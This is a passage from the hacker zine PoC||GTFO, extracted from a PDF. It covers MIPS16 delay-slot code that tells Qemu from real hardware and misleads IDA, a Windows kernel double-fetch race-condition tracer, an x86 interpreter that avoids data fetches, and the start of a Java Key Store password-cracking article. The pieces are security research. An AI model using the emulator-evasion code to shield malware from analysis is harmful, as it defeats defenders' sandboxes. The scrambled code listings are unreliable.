ages, lashing out at “RISC-deniers” who aren’t even
in the room. Just as folks begin to get bored, and
begin to sip their drinks too quickly out of nervous-
ness, Peterson jumps in and saves the day. Because
he knows that these fine folks build real machines
that really shipped, he redirects the conversation to
war stories and practical considerations.
Patterson tells how the two-stage pipeline in the
RISC 1 chip was the first design with a branch delay
slot, as there’s no point in throwing away the staged
instruction that has already finished execution. Hen-
nessy jumps in with a tale of dual instruction sets
on MIPS, allowing denser code without abandoning
the spirit of the RISC faith. Then Peterson, the
bartender, serves up a number of Xilinx devkits to
bar patrons, who begin collaborating on a five-stage
pipeline design of their own, with advice on spe-
cific design choices from David and John. The next
morning, they’ve built a working CPU and suffered
no hangovers.
If your Computer Architecture class was more
like the former than the latter, I hope that this brief
article will show you some of the joy of this fine
subject.
In PoCkGTFO 6:6, Craig Heffner discussed a va-
riety of methods for detecting Qemu emulation of
MIPS hardware. We’ll be discussing one more way
to detect emulation, but we’ll be using the MIPS16
instruction set and a clever trick of delay slots to
detect the emulation.
We wanted to craft a capability that is (a) able
to differentiate hardware from an emulation environ-
ment, and also (b) able to confuse static analysis.
We picked used standard tools: Qemu as an emula-
tion environment and IDA Pro as a disassembler. 34
The first criterion leads us to want something
that both: (a) works in userland, and (b) is not
trivial for an emulator developer to patch. Mov-
ing to userland meant that hardware registry inspec-
tion, as discussed in Section 6.1 of Heffner’s article,
would not work. Similarly, the technique of reading
cpuinfo in Section 6.2 would be easily patchable,
as Craig noted. Here, we instead seek a capability
more similar to Section 6.3, where cache incoherency
is exploited to differentiate real hardware and Qemu.
MIPS16e
SSH’ing to a newly acquired MIPS box, we find the
same nifty line of cpuinfo that struck our fancy in
Craig’s article. MIPS16 is an extension to the clas-
sic MIPS instruction set that fills the same niche as
Thumb2 does on ARM. The instructions word is 16
bits wide, a subset of the full register set is directly
available, and a core tenet of RISC is violated: some
instructions are more than one word long.
1 $ cat / proc / cpuinfo
system t y p e
3 cpu model
cpu MHz
5 tlb_entries
isa
7 ASEs implemented
:
:
:
:
:
:
BCM7358A1 STB p l a t f o r m
Broadcom BMIPS3300 V3 . 2
751.534
32
mips1 mips2 m i p s 3 2 r 1
mips16
Just like ARM, this alternate instruction set is
used whenever the least significant bit of the pro-
gram counter is set. Function pointers work as ex-
pected between the two instruction sets, and the
calling conventions are compatible.
34 We
will happily buy the drinks in celebration of Radare2 issue 1917 and Capstone issue 241 being closed.
7677MB
74K c Core Pipeline
M2 M3 M4
MDU
M1
AF AM
ALU
WB GC
GRU
IFU
IT
IS
ID
IR
IB
IK
DD
IX
DR
AC AB
ALU
DS DM
IDU
EA EC
ES
EB
AGEN
IFU
EM
AGEN
Figure 7. MIPS 74Kc Pipeline
have to either insert a bubble to delay the second
instruction until the value is ready or it would “for-
ward” the register result. 35
The MIPS 74Kc on one of our target machines
has 14 or 15 pipeline stages, depending upon how
you count, plus three additional stages for MIPS16e
instruction decoding. 36 These stages are quite well
documented, but to ease the explanation a bit, we
won’t bore you with the details of exactly what hap-
pens where. The stages themselves are shown in
Figure 7, helpfully illustrated by Ange Albertini.
Despite careful work to maintain compatibility
between MIPS16 and MIPS32, there are inevitable
differences. MIPS16 only has direct access to eight
registers, rather than the 32 of its larger cousin.
CPU Pipelines
In Hennessy and Patterson’s books, a five-stage
pipeline is described and hammered into the poor
reader’s head. This classic RISC pipeline isn’t what
you’ll find in modern chips, but it’s a lot easier to
keep in mind while working on them. The stages
in order are Instruction Fetch (IF), Instruction De-
code (ID), Execute (EX), Memory Access (MEM),
and Write Back (WB).
Each pipeline stage can only hold one instruction
at a time, but by passing the instructions through
as a queue, multiple instructions can exist in dif-
ferent stages at the same time. When a branch is
mis-predicted, the pipeline will be “flushed,” which
is to say that the partially-completed instructions
from the incorrectly guessed branch are blown to the
wind and replaced with harmless NOP instructions,
which are sometimes called “bubbles.”
Bubbles are also one way to avoid “data haz-
ards,” which are dependencies between instructions
that run at the same time. For example, if you were
to use a value just after loading it, the CPU would
Extended (Wide) Instructions
We mentioned earlier that MIPS16 instructions are
usually just one instruction word, but that some-
times they are two. That’s a bit vague and hand-
wavy, so we’d like to clear that up now with a con-
crete example.
There is an Extend Immediate instruction which
allows us to enlarge the immediate field of another
MIPS16 instruction, as its immediate field is smaller
than that in the equivalent 32-bit MIPS instruction.
This instruction is itself two bytes, and is placed
directly before the instruction which it will extend,
making the “extended instruction” a total of four
bytes.
35 Very early MIPS machines made the hazard the compiler’s responsibility, in what was called the “load delay slot.” It is
separate from the “branch delay slot” that we’ll discuss in a later section, and is no longer found in modern MIPS designs.
36 unzip pocorgtfo15.pdf mips74kc.pdf
78For example, the opcode for adding an immedi-
ate value of 1 to r2 is 0x4a01. (r2 is the register for
both the first argument to a function and its return
value.) Because MIPS16 only encodes room for five
immediate bits in this instruction, it allows for an
extension word before the opcode to include extra
bits. These can of course be zero, so 0xF000 0x4a01
also means addi r2, 1.
Some combinations are illegal. For example, ex-
tending the immediate bits of a NOP isn’t quite
meaningful, so trying to execute 0xF008 0x6500
(Extended Immediate NOP) will trigger a bus er-
ror and the process will crash.
The Extended Shift instruction shown along
with a regular Shift in Figure 8. Now how the prefix
word changes the meaning of the subsequent instruc-
tion word.
However, thinking of these two words as a single
instruction isn’t quite right, as we’ll soon see.
test of the following code reveals that the full in-
struction is executed in the delay slot.
We can test this as we see that on both real hard-
ware and Qemu, extending an instruction like a NOP
that shouldn’t be extended will trigger a bus error.
However, when we put this combination after a re-
turn, it will only crash Qemu. In this case in hard-
ware, only the extension word was fetched, which
didn’t cause an issue.
1 0 xE820 // Return .
0 xF008 // E x t e n s i o n word .
3 0 x6500 //NOP, w i l l c r a s h i f e x t e n d e d .
This is a known issue with the MIPS16e instruc-
tion set. 38 To quote page 30, “There is only one
restriction on the location of extensible instructions:
They may not be placed in jump delay slots. Doing
so causes UNPREDICTABLE results.”
Delay Slots Making Something Useful
Unlike ARM and Thumb, but like MIPS32 and
SPARC, MIPS16 has a branch delay slot. The way
most folks think of this, and the way that it is first
explained by Patterson and Hennessy, 37 is that the
very next instruction after a branch is executed re-
gardless of whether the branch is taken.
Sometimes this is hidden by an assembler, but
a disassembler will usually show the instructions in
their physical order. IDA Pro helpfully groups the
delay-slot instruction into the proper block, so in
graph view you won’t mistake it for being condi-
tionally executed. We can now crash an emulator while allowing hard-
ware to execute, but let’s improve this technique into
something that can be used effectively for evasion.
We’ll replace the NOP which caused the crash when
extended with an instruction which is intended to
be extended, specifically an add immediate, addi.
1 0 x6740 //
//
3 0 xE820 //
0 xF000 //
5 0x4A01 //
//
If we take that shellcode and view the IDA disas-
sembly for it, you will see that, as above, IDA groups
the delay-slot instruction into the function block so
it looks like one is added to the return value. See
Figure 9, being careful to remember that $v0 means
r2.
Extended Instructions in a Delay Slot
So what happens if we put a multi-word instruction
into the delay slot? IDA Pro, being first written for
X86, assumes that X86 rules apply and the whole
chunk is one instruction. Qemu agrees, and a quick
37 Page
F i r s t we z e r o r2 , t h e
return value .
j r $ra
( Return )
Extended immediate o f 0 .
Add immediate 1 t o r2 .
( o n l y e x e c u t e d i n Qemu)
444 of Computer Organization and Design, 2nd ed.
pocorgtfo15.pdf mips16e-isa.pdf
38 unzip
15
14
13
12
SHIFT
11
10
9
31 30 29 28 27 26 25 24 23 22 21 20 19 18 17 16 15 14 13 12 11 10 9
EXTEND
sa 4:0
s5 a
0
0
0
0
0
SHIFT
8
7
5
4
8
rx
7
6
ry
3
2
1
sa a
ry
Figure 8. MIPS16 Regular and Extended Shift Instructions
79
6
rx
5
0
f
4 3 2
0 0 0
1
0
fBut hang on a minute, that delay slot holds two
instruction words, and as we learned earlier, these
can be thought of as separate instructions!
In fact, IDA only shows the instruction bytes on
the left if you explicitly request a number of bytes
from the assembly be shown. Without these be-
ing shown, a reverse engineer might forget that the
program assembled a double-length instruction and
thus that this behavior will occur.
This shows how we can confuse static analysis
tools, which disassemble without taking into account
this special case.
Let’s now look at what happens when we take
the above shellcode and execute it as a function from
a program. We print the return value from the func-
tion in the below sample output.
1 int exec16 ( int ( ∗ f p t r 1 6 ) ( int ) ,
int verbose ) {
3
uint32_t r e s ;
uint8_t ∗ bytes ;
5
int ( ∗ f u n c t i o n P t r ) ( int ) ;
f u n c t i o n P t r =(void ∗ ) ( ( ( i n t ) f p t r 1 6 ) | 1 ) ;
7
return f u n c t i o n P t r ( 0 x d e a d b e e f ) ;
}
9
u i n t 1 6 _ t amiemulated16 [ ] = {
11 0 x6740 , // F i r s t we z e r o r2 , t h e
// r e t u r n v a l u e .
13 0xE820 , // j r $ra
( Return )
0 xF000 , // Extended immediate o f 0 .
15 0x4A01 // Add immediate 1 t o r2 .
// ( o n l y e x e c u t e d i n Qemu)
17 } ;
We’ve discussed how IDA sees the extended ad-
dition as a single instruction, when in fact they are
two separate MIPS instructions. But how is this
handled in an emulator versus real MIPS hardware?
On the real hardware, when the return instruc-
tion is processed, the next instruction in the pipeline
is 0xF000 (the extension instruction) and this is ex-
ecuted in the branch delay slot. That instruction,
however, becomes a NOP in hardware.
19 i n t main ( ) {
p r i n t f ( " I am r u n n i n g %s . \ n" ,
21
e x e c 1 6 ( ( void ∗ ) amiemulated16 , 0 )
? " i n Qemu"
23
: " on r e a l hardware " ) ;
return 0 ;
25 }
ROM: 0 0 0 0
2 ROM: 0 0 0 0
ROM: 0 0 0 0
4 ROM: 0 0 0 0
ROM: 0 0 0 2
6 ROM: 0 0 0 4
ROM: 0 0 0 4
. s e t mips16
# ====== SUBROUTINE ======
amiemulated :
67
40
move $v0 , $ z e r o
E8
20
jr
$ra
F0
00 4A 01
addiu $v0 , 1
# End o f f u n c t i o n amiemulated
#
#
#
#
Clear return value to zero .
Return
Adds 1 t o r e t u r n v a l u e i n Qemu .
This becomes a NOP on r e a l hardware .
Figure 9. MIPS16 Machine Code abusing the Delay Slot
801 ~$ uname −a
Linux t a r g e t 3 . 1 2 . 1 #1 mips GNU/ Linux
3 ~$ . / h e l l o
I am r u n n i n g on r e a l hardware .
The reason this detection works, we hypothesize,
is because Qemu doesn’t actually have a pipeline,
and thus it is emulated by knowing that it should
run the instruction following a branch, to “correctly”
handle the branch-delay slot. When it reads that
next instruction, it reads the two instructions that
it sees as a single extended instruction, instead of
just reading the extension.
~$ mips−l i n u x −gnu−g c c − s t a t i c −s t d=gnu99 \
hello . c
−o h e l l o
~$ qemu−mips −L / u s r / mips−l i n u x −gnu h e l l o
4 I am r u n n i n g i n Qemu .
2
In hardware, we should note, the instruction isn’t
exactly tossed away because it’s broken in half. The
extension word, as the first half of the pair, never
really gets executed on its own; rather, it hangs
around in the pipeline to modify the subsequent in-
struction word. As the pipeline flows, the first word
becomes a bubble as the second word becomes the
single, unified instruction, but that unified instruc-
tion is too late to be executed. Instead, it is cruelly
flushed from the MIPS16 pipeline while the bible
ahead of it becomes a worthless NOP.
Thus, with just the eight byte function 0x6740
0xe820 0xf000 0x4a01, we can reliably detect em-
ulation of MIPS16. As an added bonus, IDA Pro
will agree with the simulation behavior, rather than
the hardware behavior.
–——–
———
—–—–
Kind thanks are due to Thorsten Haas for lend-
ing us a MIPS shell account on impossibly short
notice. If you’d like to play around with more dif-
ferences between hardware and emulation, we’ll note
that in MIPS32, 0x03E00008 0x03E00008 is a clean
return to $ra on hardware, but crashes Qemu. To
crash on hardware and return normally in Qemu,
use 0x03e0f809 0x8fe20001.
Cheers from Hanover, New Hampshire,
Travis and Ryan
8115:10
Windows Kernel Race Condition Analysis While Accessing
User-mode Data
by BSDaemon and NadavCh
In 2013, Google’s researchers Mateusz Jurczyk
(J00ru) and Gynvael Coldwind released a paper en-
titled “Identifying and Exploiting Windows Kernel
Race Conditions via Memory Access Patterns.” 39
They discussed race conditions in the Windows ker-
nel while accessing user-mode data and demonstrate
how to find such conditions using an instrumented
emulator. More importantly, they offered a very
thorough explanation of how the identification of
such issues is possible, specifically listing these con-
ditions of interest:
1. At least two reads of the same virtual address;
2. Both read operations take place within a short
time frame. The authors specifically recom-
mend identifying reads in the handling of a
single kernel entrance;
3. The reads must execute in kernel mode;
4. The virtual address subject to multiple reads
must reside in memory writable by Ring-3
threads, in order for the user mode to be able
to take advantage of the race.
Interestingly most of these races are
exploitable—i.e., possible for the attacker to win—
on modern machines given multiple CPU cores.
The exceptions would be in memory areas that
are administrator-owned, or in situations that are
early boot—and thus not in a memory area that
can be mapped by an attacker. Even if the user-
mode area is only writable by administrator-owned
tasks, it might still be a problem given that it leads
to code execution in kernel mode that is prohib-
ited to the administrator and bypasses kernel driver
signing. Notably, the early boot cases are only non-
exploitable if they are not part of services prohibited
after boot.
We reproduced Google’s research using Intel’s
SAE 40 and got some interesting results. This paper
explains our approach in the hope of helping others
understand the importance of documenting findings
and processes. It also demonstrates other findings
and clarifies the threat model for the Windows Ker-
nel, thanks to our discussions with the MSRC. We
share all the traces that generated double fetches for
Windows 8 (pre and post booting) and Windows 10
(again, pre and post boot). 41
We also share our implementation: it contains
the parameters we used for our findings, the tracer,
and the analyzer—and can be used as reference to
audit other areas of the system. It also serves as a
good way to understand the instrumentation capa-
bilities of Simics and SAE, even though these are,
unfortunately, not open-source tools.
For the findings per se, almost all parameters ap-
pear to be probed and copied to local buffers inside
of try-except blocks. We flagged them as double-
fetches because some of the pointers are probed
first and then accessed to copy out actual data,
like PUNICODE_STRING->Buffer. One of them is
not inside a try-catch block and is a local DoS,
but we do not consider it a security issue, since it
is in administrator-owned memory. Many of them
are not related to Unicode strings and are poten-
tial escalations-of-privilege (see Figure 10), but once
again, for the threat model of the Windows Kernel,
administrator-initiated attacks are out of scope.
Microsoft nevertheless fixed some of the reported
issues. Obviously, mitigations in kernel mode might
still prevent or make exploiting some of those very
difficult.
Our findings concern three classes of issues:
Admin ↔ kernel cases: Microsoft did fix these, even
though their threat model does not consider this a
security issue. They may have considered the pos-
sibility of these cases used for a CSP bypass or a
sandbox bypass—even though we did not find cases
where a sandboxed process had administrator priv-
ileges.
Local DoS cases: These were also fixed, considering
that a symlink can be created by anyone and this
was a non-admin-only case.
Other cases: The rest of the cases do not appear to
be of consequence of security. We are sharing the
traces with the community, in case anyone is inter-
ested in double-checking :)
39 Mateusz Jurczyk and Gynvael Coldwind, “Identifying and Exploiting Windows Kernel Race Conditions via Memory Access
Patterns,” Google, 2013. unzip pocorgtfo15.pdf bochspwn.pdf
40 Nadav Chachmon et al., “Simulation and Analysis Engine for Scale-Out Workloads,” Proceedings of the 2016 International
Conference on Supercomputing (ICS ’16), Istanbul, Turkey; unzip pocorgtfo15.pdf chachmon.pdf
41 git clone https://github.com/rrbranco/kdf ; unzip pocorgtfo15.pdf kdf.zip
82Tool Description Approach
We implemented a Kernel Double Fetch tool (KDF),
similar to the tool described in Identifying and Ex-
ploiting Windows Kernel Race Conditions via Mem-
ory Access Patterns. 42 The tool has a runtime
phase, in which KDF candidates are identified, and
a post-runtime phase, in which these KDF candi-
dates are analyzed based on whether the fetches are
actually used by the kernel.
In the runtime phase, there is a ztool that looks
for system-call related instructions. When such an
instruction is triggered, the tool will dynamically
configure itself to enable memory access notifica-
tions and instruction execution notifications. When-
ever the kernel reads from the same user-space ad-
dress twice or more, the tool will generate a file that
describes the assembly instructions and the memory
access addresses. As an optimization, the tool ana-
lyzes each system call number only the first time it
is called; consecutive calls to the same system call
will not be analyzed. As correctly pointed out by
J00ru, though, this optimization can hinder the dis-
covery of some potential bugs that are only reached
under very specific conditions—and not during the
first invocation of the affected system call. The code
can be easily changed to address that concern.
After this work has completed, the KDF candi-
dates are filtered, and only if the kernel read the
memory twice or more and performed some opera-
tion based on the read, a violation will be reported.
We make the KDF ztool source code public.
You may get it from under <zsim-kit>/src/ztools
and open the Visual Studio solution. Make sure you
build an x64 version of the tool. (Look in the Vi-
sual Studio configuration.) After that you can load
the tool when you boot Win10. The tool generates
candidates for KDF in separate log file in the cur-
rent working directory. After completing the run of
the simulation you may use the kdf_analyzer. The
real KDF candidates will be located in the results
directory. The simulation tool is dependent on SAE, and runs
as a plugin to it. It works by loading the KDF
tool included in this paper, booting the OS, and
executing whatever test bench; the plugin will cap-
ture suspicious violations. After stopping the sim-
ulation, the KDF-analyzer scans the suspected vio-
lations recorded by the plugin and outputs the con-
firmed cases of double-fetches. Note that while these
are real double-fetches, they are not necessarily se-
curity issues.
The algorithm of the plugin works as follows. It
starts the analysis upon a SYSCALL instruction,
monitoring kernel reads from user addresses. It re-
ports a violation on two reads from the same user-
space address in the same instruction window. It
stops the KDF analysis after Instruction-Window is
reached in the same syscall scope, or upon a ring
transition.
Performance is guaranteed since each syscall is
instrumented only once and the instrumentation is
enabled only in the system call range, supported by
the tool itself.
The analyzer—responsible for post-analysis of
the potential violations—is a Python script that
manages the data flow dependencies. It adds a ref-
erence upon a copy from a suspected address to a
register/address. It removes the dependency refer-
ence upon a write to a previously referenced regis-
ter/memory, similar to a taint analysis. It reports
a violation only if two or more distinct kernel reads
happen from the same user-mode address.
We looked into the system call range 0–5081.
We dynamically executed 450 syscalls within that
range—meaning that our test bed is far from com-
pletely covering the entire range. The number of
suspected cases flagged by the plugin was 67 and
the number of violations identified was 8.
Interesting Cases
Figure 10 shows some of the interesting cases. The
Windows version was build number 10240, TH1
RTM candidate.
You will find traces extracted from our tests in
directories win10_after_boot/ and win8_after_-
boot/. As the names imply, they were collected af-
ter booting the respective Windows versions by just
using the system: opening calc, notepad, and the
recycle bin.
cd s r c / z t o o l s / k d f
python3 . 4 k d f _ a n a l y z e r \
−i d <zsim−s i m i c s −workspace> \
− i f <kdf−v i o l a t i o n s −basename> \
−rd <r e s u l t s −d i r e c t o r y >
42 http://research.google.com/pubs/pub42189.html
83API
nt!CmOpenKey
nt!CmCreateKey
nt!SeCaptureObject-
AttributeSecurity-
DescriptorPresent
nt!SeCaptureSecurity-
Qos
nt!ObpCaptureObject-
CreateInformation
nt!EtwpTraceMessageVa
nt!NtCreateSymbolic-
LinkObject
win32kbase!bPEB-
CacheHandle
Exploitable?
No
No
No
No
No
No
Why?
UNICODE_STRING, Read the Unicode structure and then read the
actual string. Both are properly probed.
UNICODE_STRING
Reading and then Checking if NULL. Getting length, probing, and
then copying data
Reading, checking against NULL, probing and then copying data
UNICODE_STRING, May lead to Local DOS. No try-catch on user
mode address reference, at least not at the top function; it may be
deeper in the call stack
Working on addresses of PEB structure and not on pointers, try-
catch will save in case of a malformed PEB
Figure 10. Interesting cases.
The filenames include the system call
number and the address of the occurrence,
to help identify the repeated cases, e.g.,
kdf-syscall-4101.log.data_flow_0x7ffe0320,
kdf-syscall-4104.log.data_flow_0x7ffe0320,
kdf-syscall-4105.log.data_flow_0x7ffe0320.
For example, the address 0x7ffe0320 repeats in
both Win10 and Win8 traces. We kept these re-
peated traces just to facilitate the analysis.
We also include the directories results_-
win10_boot/ and result_win8_boot/, which show
the traces of interest during the boot process. These
conditions are less likely to be exploitable, but some
addresses in them repeat post-boot as well.
The format of trace files is quite straightforward,
with comments inserted for events of interest:
−−START ANALYZING KDF, ADDRESS: 0 x 2 f 7 4 0 6 f 3 9 0
−− −> D e f i n e s t h e a d d r e s s o f i n t e r e s t
Also included are the instructions performed
during the analysis/trace:
180: 0 xfffff803650acdd4
mov rcx , qword p t r [ rbx+0x10 ]
READ: VA = 0 x 2 f 7 4 0 6 f 3 9 0 , LA = 0 x 2 f 7 4 0 6 f 3 9 0 ,
PA1 = 0 x79644390 , SIZE = 0x8 ,
DATA = 0 x 0 0 0 2 f 7 4 6 f 3 f 8
84The KDF detection happens on the following
commentary on the trace:
−−Data−f l o w dependency o r i g i n a t e d from
−− l i n e 180 i s used : r c x
As you can see, the commentary includes the line
at which the data-flow dependency was marked.
Our detection process begins when a syscall in-
struction is issued. While inside the call, we analyze
kernel reads from the user address space, and re-
port whenever two reads hit the same address; how-
ever, we remove references if a write is issued to the
address. We stop the analysis once an instruction
threshold is hit, or a ring transition happens.
Future Work
Leveraging our method and the toolset should make
the following tasks possible.
First, it should be possible to find multiple writes
to the same user-mode memory area in the scope of
a single system service. This is effectively the oppo-
site of the current concept of a violation. This may
potentially find instances of accidentally disclosed
sensitive data, such as uninitialized pool bytes, for
a short while, before such data is replaced with the
actual system call result.
Second, it should be possible to trace execution
of code with CPL=0 from user-mode virtual address
space, a condition otherwise detected by the SMEP
mechanism introduced in the latest Intel processors.
Similarly, it should be possible to trace execution of
code from non-executable memory regions that are
not subject to Data-Execution-Prevention, such as
non-paged pools in Windows.
Third, KDF should be studied on more operat-
ing systems.
Last but not least, other cases of cross-privilege
mode double fetches should be investigated. There
is far more work left to be done in tracing access to
find these sorts of bugs.
Acknowledgments
We would like to thank Google researchers Mateusz
Jurczyk and Gynvael Coldwind for releasing an awe-
some paper on the subject with enough details to
reproduce their findings. (Mateusz was also kind
enough to give feedback on this paper.) MSRC for
helping to better define the threat model for Win-
dows Kernel Vulnerabilities, and for their collabo-
ration to triage the issues. We also thank Intel’s
Windows OS Team, specially Deepak Gupta and
Volodymyr Pikhur, for their help in the analysis of
the artifacts.
85Employees lose respect
for a company that
fails to provide
decent facilities for
their comfort
ry wiping your hands six days a
week on harsh, cheap paper towels or
T
awkward, unsanitary roller towels—and
maybe you, too, would grumble.
Towel service is just one of those small,
but important courtesies—such as proper
air and lighting—that help build up the
goodwill of your employees.
That’s why you’ll find clothlike Scot-
Tissue Towels in the washrooms of large,
well-run organizations such as R.C.A.
Victor Co., Inc., National Lead Co. and
Campbell Soup Co.
ScotTissue Towels are made of “thirsty
fibre”. . . an amazing cellulose product
that drinks up moisture 12 times as fast
as ordinary paper towels. They feel soft
and pliant as a linen towel. Yet they’re
so strong and tough in texture they won’t
crumble or go to pieces . . . even when
they’re wet.
And they cost less, too—because one
is enough to dry the hands—instead of
three or four.
Write for free trial carton. Scott Paper
Company, Chester, Pennsylvania.
- really dry!
Reprinted by the Tract Association of PoCkGTFO and Friends15:11
X86 is Turing-Complete without Data Fetches
by Chris Domas
One might expect that to compute, we must first
somehow access data. Even the most primitive Tur-
ing tarpits generally provide some type of load and
store operation. It may come as a surprise, then,
that most modern architectures are Turing-complete
without reading data at all!
We begin with the (somewhat uninspiring) ob-
servation that the effect of any traditional data fetch
can be accomplished with a pure instruction fetch
instead.
data:
.dword
mov
through a jmp to the BF data cell, which loads
an immediate, and jumps back. Writes to the BF
memory space are executed as self modifying code,
overwriting the immediate value loaded by the data
cell. To satisfy our “no data fetch” requirement, we
should implement the BrainFuck interpreter without
a stack. The I/O BF instructions (. and ,), which
use an int 0x80, will, at some point, use data reads
of course, but this is merely a result of the Linux im-
plementation of I/O.
First, let us create some macros to help with the
simulated data fetches:
0xdeadc0de
eax, [data]
That fetch in pure code would be a move sourced
from an immediate value.
mov
%macro simcall 1
mov
esi, %%retsim
jmp
%1
%%retsim:
%endmacro
eax, 0xdeadc0de
%macro simfetch 2
mov
edi, %2
shl
edi, 3
add
edi, %1
mov
esi, %%retsim
jmp
edi
%%retsim:
%endmacro
With this, let us then model memory as an array
of “fetch cells,” which load data through instruction
fetches alone.
cell_0:
mov
jmp
cell_1:
mov
jmp
cell_2:
mov
jmp
eax, 0xdeadc0de
esi
eax, 0xfeedface
esi
%macro simwrite 2
mov
edi, %2
shl
edi, 3
add
edi, %1+1
mov
[edi], eax
%%retsim:
%endmacro
eax, 0xcafed00d
esi
So to read a memory cell, without a data fetch,
we’ll jmp to these cells after saving a return address.
By using a jmp, rather than a traditional function
call, we can avoid the indirect data fetches from the
stack that occur during a ret.
mov
jmp
mret:
esi, mret
cell_2
Next, we’ll compose the skeleton of a basic BF
interpreter:
_start:
.execute:
simcall fetch_ip
simfetch program, eax
load return address
load cell 2
return
cmp
je
cmp
je
cmp
je
cmp
je
cmp
je
cmp
je
cmp
je
jmp
A data write, then, could simply modify the im-
mediate used in the read instruction.
mov
[cell_1+1], 0xc0ffee
set cell 1
Of course, for a proof of concept, we should actu-
ally compute something, without reading data. As
is typical in this situation, the BrainFuck language is
an ideal candidate for implementation — our fetch
cells can be easily adapted to fit the BF memory
model.
Reads from the BF memory space are performed
al, 0
.exit
al, ’>’
.increment_dp
al, ’<’
.decrement_dp
al, ’+’
.increment_data
al, ’-’
.decrement_data
al, ’[’
.forward
al, ’]’
.backward
done
Then, we’ll implement each BF instruction with-
out data fetches.
87.increment_dp:
simcall fetch_dp
inc
eax
mov
[dp], eax
jmp
.done
.backward:
simcall fetch_dp
simfetch data, eax
cmp
al, 0
je
.done
mov
ecx, 1
.backward.seek:
simcall fetch_ip
dec
eax
mov
[ip], eax
simfetch program, eax
cmp
al, ’[’
je
.backward.seek.dec
cmp
al, ’]’
je
.backward.seek.inc
jmp
backward.seek
.backward.seek.inc:
inc
ecx
jmp
.backward.seek
.backward.seek.dec:
dec
ecx
cmp
ecx, 0
je
.done
jmp
.backward.seek
.decrement_dp:
simcall fetch_dp
dec
eax
mov
[dp], eax
jmp
.done
.increment_data:
simcall fetch_dp
mov
edx, eax
simfetch data, edx
inc
eax
simwrite data, edx
jmp
.done
.decrement_data:
simcall fetch_dp
mov
edx, eax
simfetch data, edx
dec
eax
simwrite data, edx
jmp
.done
.forward:
simcall
simfetch
cmp
jne
mov
fetch_ip
eax
[ip], eax
.execute
.exit:
mov
mov
int eax, 1
ebx, 0
0x80
Finally, let us construct the unusual memory
tape and system state. In its data-fetchless form,
it looks like this.
fetch_dp
data, eax
al, 0
.done
ecx, 1
fetch_ip:
db
ip:
dd
jmp
fetch_dp:
db
dp:
dd
jmp
data:
times
db
.forward.seek:
simcall fetch_ip
inc
eax
mov
[ip], eax
simfetch program, eax
cmp
al, ’]’
je
.forward.seek.dec
cmp
al, ’[’
je
.forward.seek.inc
jmp
.forward.seek
.forward.seek.inc:
inc
ecx
jmp
.forward.seek
.forward.seek.dec:
dec
ecx
cmp
ecx, 0
je
.done
jmp
.forward.seek
43 git
.done:
simcall
inc
mov
jmp
program:
times
db
0xb8
mov eax, xxxxxxxx
0
esi
0xb8
mov eax, xxxxxxxx
0
esi
30000 \
0xb8, 0, 0, 0,
0, 0xff, 0xe6, 0x90 mov eax, xxxxxxxx, jmp
esi, nop
30000 \
0xb8, 0, 0, 0,
0, 0xff, 0xe6, 0x90 mov eax, xxxxxxxx, jmp
esi, nop
For brevity, we’ve omitted the I/O functionality
from this description, but the complete interpreter
source code is available. 43
And behold! a functioning Turing machine on
x86, capable of execution without ever touching the
data read pipeline. Practical applications are nonex-
istent.
clone https://github.com/xoreaxeaxeax/tiresias || unzip pocorgtfo15.pdf tiresias.zip
8815:12
Nail in the Java Key Store Coffin
by Tobias “Floyd” Ospelt
The Java Key Store (JKS) is Java’s way of stor-
ing one or several cryptographic private and public
keys for asymmetric cryptography in a file. While
there are various key store formats, Java and An-
droid still default to the JKS file format. JKS is one
of the file formats for Java key stores, but the same
acronym is confusingly also used the general key
store API. This article explains the security mecha-
nisms of the JKS file format and how the password
protection of the private key can be cracked. Due
to the unusual design of JKS, we can ignore the key
store password and crack the private key password
directly.
By exploiting a weakness of the Password Based
Encryption scheme for the private key in JKS, pass-
words can be cracked very efficiently. As no pub-
lic tool was available exploiting this weakness, we
implemented this technique in Hashcat to amplify
the efficiency of the algorithm with higher cracking
speeds on GPUs.
covery mechanism to recover a lost private key, so
efficient cracking of JKS files also benefits develop-
ers who forgot their passwords.
The JKS format is due to be replaced by
PKCS12 as the default key store format in the up-
coming Java 9. 46 When talking to members of
the security community who can still remember the
nineties, some seem to remember that JKS uses
some kind of weak cryptography, but nobody re-
members exactly. Let’s explore weaknesses of the
JKS file format and what an attacker needs to ex-
tract a private key in cleartext.
When a new key store is created and a new key-
pair generated, the developer has to set at least two
passwords. There is not only a password for the
key store as a whole (key store password), but each
private key in it has its own password as well (pri-
vate key password), while public keys do not have
passwords. Both passwords are used independently.
Surprisingly, the key store password is not used to
encrypt any parts of the JKS file format, it is only
used for integrity protection. This means the en-
crypted private key bytes and the cleartext bytes of
public keys in a key store can be extracted without
knowing the key store password. 47 The password
of the private key however, is used to apply a cus-
tom Password Based Encryption to the private key.
Having two passwords leads to three possible cases.
In the first case, there is a password on the key
store, but no private key password is used. (In prac-
tice, the available Java APIs prevent this.) However,
in such a key store the private key would not be pro-
tected at all.
The second case is when the key store password
and the private key password are identical. This is
very common in practice and the default behavior
of most tools such as Java’s keytool command. If
no separate password for the private key is specified,
the private key password will be set to the key store
password.
In the third case, both passwords are set but the
The JKS File Format
Examples and API documentation for developers
use the JKS file format heavily, without any se-
curity warnings. 44 This format has been the de-
fault key store since key stores were introduced to
Java. As early as 1999, JDK 1.2 introduced the “-
much stronger” JCEKS format that uses 3DES. 45
However, JKS remained the default format. Just to
mention some examples, Oracle databases and the
Apache Tomcat webserver still use the JKS format
to store their private keys.
When building an Android 7 app in the Android
Studio IDE, it will create a JKS file with which
to self-sign the app. Every application on Android
needs to be signed before it can be installed on a
device, and the phone will check that an update for
an app is signed with the same key again. The pri-
vate keys generated by Android Studio are valid for
25 years by default. Android does not offer any re-
44 http://docs.oracle.com/javase/6/docs/api/java/security/KeyStore.html#getDefaultType()
http://download.java.net/java/jdk9/docs/api/java/security/KeyStore.html#getDefaultType--
https://developer.android.com/reference/java/security/KeyStore.html#getDefaultType()
http://stackoverflow.com/questions/11536848/keystore-type-which-one-to-use
http://www.pixelstech.net/article/1408345768-Different-types-of-keystore-in-Java----Overview
45 See Dan Boneh’s notes on JCE 1.2 from CS255, Winter of 2000.
46 http://openjdk.java.net/jeps/229
47 https://gist.github.com/zach-klippenstein/4631307
89key store password is not the same as the private key
password. While not the default behavior, it is still
very common that users choose a different password
for the private key.
It is important to demonstrate that in the third
case some password crackers will crack a password
that is useless and cannot be used to access the pri-
vate key. The Jumbo version of the John the Rip-
per password cracking tool does this, cracking the
(useless) key store password rather than the private
key password. Let’s generate a key store with differ-
ent key store (storepass) and private key password
